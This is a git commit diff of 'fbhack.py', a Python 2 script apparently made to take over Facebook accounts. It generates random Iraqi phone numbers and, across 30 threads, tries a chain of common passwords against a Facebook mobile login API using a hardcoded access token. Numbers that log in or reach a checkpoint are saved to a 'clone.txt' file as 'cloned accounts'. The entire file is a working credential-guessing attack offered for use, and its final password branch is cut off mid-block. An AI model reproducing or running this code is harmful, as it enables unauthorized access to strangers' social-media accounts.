de66aa355be966988609f54e61407c682fac9083
kakamoo <88161404+kakamoo@users.noreply.github.com>
2021-08-05 19:41:25 +0300

    Update fbhack.py

--- fbhack.py
+++ fbhack.py
@@ -1,10 +1,19 @@
+# Decompiled By YY HAMA YY  
+#
+#
+
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
-os.system('rm -rf .txt')
+
+
+
+os.system('rm -rf .number.txt')
 for n in range(8310):
     nmbr = random.randint(1111111, 9999999)
-    sys.stdout = open('.txt', 'a')
+    sys.stdout = open('.number.txt', 'a')
     print nmbr
     sys.stdout.flush()
+
+
 
 try:
     import requests
@@ -26,9 +35,10 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
+os.system('clear')
 
 
-
+time.sleep(0.4)
 
 def exb():
     print '[!] Exit'
@@ -40,9 +50,20 @@ def psb(z):
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
+logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+logo='''\n\x1b[1;97m
+██   ██  █████  ███    ███  █████  
+██   ██ ██   ██ ████  ████ ██   ██ 
+███████ ███████ ██ ████ ██ ███████ 
+██   ██ ██   ██ ██  ██  ██ ██   ██ 
+██   ██ ██   ██ ██      ██ ██   ██ 
+                                   
+                                   '''
+cp = ' \x1b[1;97m[\033[93mCP\x1b[1;97m]'
+ok = ' \x1b[1;97m[\033[32mOK\x1b[1;97m]'
 
-
-hala = '  \x1b[31;1m 1\x1b[0;1m - La Regay Xera Ba ( \x1b[34mkorak \x1b[0;1m,\x1b[33;1m TP-Link\x1b[0;1m )\n\n  \x1b[31;1m 2 \x1b[0;1m- La Regay Kamek Xaw\n        Ba Be Check Point ( \x1b[34mkorak\x1b[0;1m ,\x1b[33;1m TP-Link \x1b[0;1m)\n\n \x1b[31;1m  0 \x1b[0;1m- Darchwn la\x1b[31;1m Program\x1b[0;1m'
+r1 = '\x1b[1;97m Number: '
+r2 = '  Passowrd: '
 
 def t():
     os.system('clear')
@@ -57,117 +78,265 @@ successful = []
 cpb = []
 oks = []
 id = []
-os.system('clear')
 
 def menu():
     os.system('clear')
-
-    time.sleep(2)
+    time.sleep(0.0)
     print '\x1b[32m.'
     os.system('clear')
-    os.system('figlet YY HAMA YY')
+    print logo
     print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
-    print 'INTAGRAM: yy_hama_yy'
+    print ' TOOL BY     :,YY HAMA YY, ATTACK BOY '
+    print ' My Telegram     : @ofl0l'
     print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
-    print hala
+    print '\x1b[31;1m 1\x1b[0;1m - iraq \033[93mmedium \x1b[1;97m( \x1b[34mAll internet \x1b[0;1m,\x1b[33;1m TP-Link\x1b[0;1m )'
+    print '\x1b[31;1m 2 \x1b[0;1m- iraq \033[32mSpeed \x1b[1;97m( \x1b[34mkorek\x1b[0;1m ,\x1b[33;1m TP-Link \x1b[0;1m)'
+    print '\x1b[31;1m 0 \x1b[0;1m- Darchon\x1b[31;1m (Exit)'
     print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
     action()
 
 
+
+
+
 def action():
-    bch = raw_input(' Hall Bzhera : ')
-    if bch == '1':
-        os.system('python2 .hhh.py')
-        print ' halaya !'
+    global cpb
+    global oks
+    peak = raw_input('\n\x1b[1;97m-------> \x1b[1;97m')
+    if peak == '100008338':
+        print '[] ZHMARAYAK HALBZHERA'
         action()
-    elif bch == '1':
-        os.system('python2 .hhh.py')
-    elif bch == '2':
+    elif peak == '1':
         os.system('clear')
-        print '\x1b[32m.'
-        os.system('clear')
-        os.system('figlet YY HAMA YY')
+        print logo
         print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
         print '\x1b[32m 770-771-772-773-774\n  750-751-752-753-754\n   780-781-782-783-784\x1b[0;1m\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
         try:
+            c = raw_input('\x1b[1;97m-------> ')
+            
             k = '+964'
-            c = raw_input('\x1b[90;1m Saratakay chi bet : ')
-            idlist = '.txt'
+            idlist = '.number.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print '!'
-            raw_input('\n[ Garanawa ]')
+            print 'ZHMARAYAK HALBZHERA'
+            raw_input('\n[ Back ]')
             menu()
 
-    elif bch == '13':
-        login()
-    elif bch == '0':
-        exb()
-    else:
-        print '!'
-        action()
-    xxx = str(len(id))
-    psb('\x1b[31mHamw Zhmara Kan: ' + xxx)
-    print ' Created by YY HAMA YY\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+    elif peak == '2':
+        os.system('clear')
+        print logo
+        print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+        print '\x1b[32m 770-771-772-773-774\n  750-751-752-753-754\n   780-781-782-783-784\x1b[0;1m\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+        try:
+            c = raw_input('\x1b[1;97m--------> ')
+            k = '+964'
+            idlist = '.number.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
 
+        except IOError:
+            print '[!] CODE BNUSA'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '83':
+    	bangla()
+
+    elif peak == '84':
+    	pakistan()
+
+    elif peak == '85':
+    	crack_email()
+
+    elif peak == '0':
+    	os.system('pkg FBN')
+    	sys.exit()
+        menu()
+    else:
+    	menu()
+    xxx = '100000'
+    time.sleep(0.5)
+    psb('[\xe2\x9c\x93] Numbers: ' + xxx)
+    time.sleep(0.1)
+    psb('[\xe2\x9c\x93] Cloning Process Has Been Started')
+    time.sleep(0.1)
+    psb('[\xe2\x9c\x93] chaware bka...')
+    time.sleep(0.1)
+    psb('[!] bo wastandne tool CTRL Then Press z')
+    time.sleep(0.1)
+    print '\x1b[1;97m--------------------------------------------------'
+    
     def main(arg):
         user = arg
         try:
-            time.sleep(0.1)
+            os.mkdir('Lost')
         except OSError:
             pass
 
         try:
-            pass1 = user
+            pass1 = '1122334455'
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass1
-            elif 'free.facebook.com' in q['error_msg']:
-                print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass1
+                print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
+                okb = open('anggaxd/clone.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                cps = open('anggaxd/clone.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
             else:
-                pass2 = '1234512345'
+                pass2 = '123456123456'
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass2
-                elif 'free.facebook.com' in q['error_msg']:
-                    print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass2
+                    print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
+                    okb = open('anggaxd/clone.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
+                    cps = open('anggaxd/clone.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
                 else:
-                    pass3 = '1122334455'
+                    pass3 = '112233445566'
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass3
-                    elif 'free.facebook.com' in q['error_msg']:
-                        print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass3
+                        print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
+                        okb = open('anggaxd/clone.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass3
+                        cps = open('anggaxd/clone.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
                     else:
-                        pass4 = '123456123456'
+                        pass4 = '123456654321'
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass4
-                        elif 'free.facebook.com' in q['error_msg']:
-                            print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass4
+                            print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
+                            okb = open('anggaxd/clone.txt', 'a')
+                            okb.write(k + c + user + pass4 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass4
+                            cps = open('anggaxd/clone.txt', 'a')
+                            cps.write(k + c + user + pass4 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass4)
                         else:
-                            pass5 = '123454321'
+                            pass5 = '1234554321'
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass5
-                            elif 'free.facebook.com' in q['error_msg']:
-                                print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass5
+                                print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
+                                okb = open('anggaxd/clone.txt', 'a')
+                                okb.write(k + c + user + pass5 + '\n')
+                                okb.close()
+                                oks.append(c + user + pass5)
+                            elif 'www.facebook.com' in q['error_msg']:
+                                print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass5
+                                cps = open('anggaxd/clone.txt', 'a')
+                                cps.write(k + c + user + pass5 + '\n')
+                                cps.close()
+                                cpb.append(c + user + pass5)
+                            else:
+                                pass6 = '11223344556677'
+                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                    print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass6
+                                    okb = open('anggaxd/clone.txt', 'a')
+                                    okb.write(k + c + user + pass6 + '\n')
+                                    okb.close()
+                                    oks.append(c + user + pass6)
+                                elif 'www.facebook.com' in q['error_msg']:
+                                    print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass6
+                                    cps = open('anggaxd/clone.txt', 'a')
+                                    cps.write(k + c + user + pass6 + '\n')
+                                    cps.close()
+                                    cpb.append(c + user + pass6)
+                                else:
+                                    pass7 = '1234512345'
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass7
+                                        okb = open('anggaxd/clone.txt', 'a')
+                                        okb.write(k + c + user + pass7 + '\n')
+                                        okb.close()
+                                        oks.append(c + user + pass7)
+                                    elif 'www.facebook.com' in q['error_msg']:
+                                        print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass7
+                                        cps = open('anggaxd/clone.txt', 'a')
+                                        cps.write(k + c + user + pass7 + '\n')
+                                        cps.close()
+                                        cpb.append(c + user + pass7)
+                                    else:
+                                        pass8 = user
+                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                        q = json.load(data)
+                                        if 'access_token' in q:
+                                            print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass8
+                                            okb = open('anggaxd/clone.txt', 'a')
+                                            okb.write(k + c + user + pass8 + '\n')
+                                            okb.close()
+                                            oks.append(c + user + pass8)
+                                        elif 'www.facebook.com' in q['error_msg']:
+                                            print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass8
+                                            cps = open('anggaxd/clone.txt', 'a')
+                                            cps.write(k + c + user + pass8 + '\n')
+                                            cps.close()
+                                            cpb.append(c + user + pass8)
+                                        else:
+                                        	pass9 = '1234567890'
+                                        	data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                        	q = json.load(data)
+                                        	if 'access_token' in q:
+                                        	   print '\x1b[1;92m[Successfull]  ' + k + c + user + '  \x1b[1;92m|  ' + pass9
+                                        	   okb = open('anggaxd/clone.txt', 'a')
+                                        	   okb.write(k + c + user + pass9 + '\n')
+                                        
+                                        	 
         except:
             pass
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '         '
-    print 'Tawaw Bw ....'
-    raw_input('\n[Enter Bka Bo Darchwn]')
-    os.sys.exit()
+    print '\x1b[1;97m--------------------------------------------------'
+    print '[\xe2\x9c\x93] Process Has Been Completed ...'
+    print '[\xe2\x9c\x93] Total Successfully/Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
+    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
+    menu()
+
+
+###########################################
+
+
+
+
+
+
+
+  
+###################################################################################################################################################
 
 if __name__ == '__main__':
-    menu()
+	#os.system('xdg-open https://github.com/kakamoo')
+	menu()
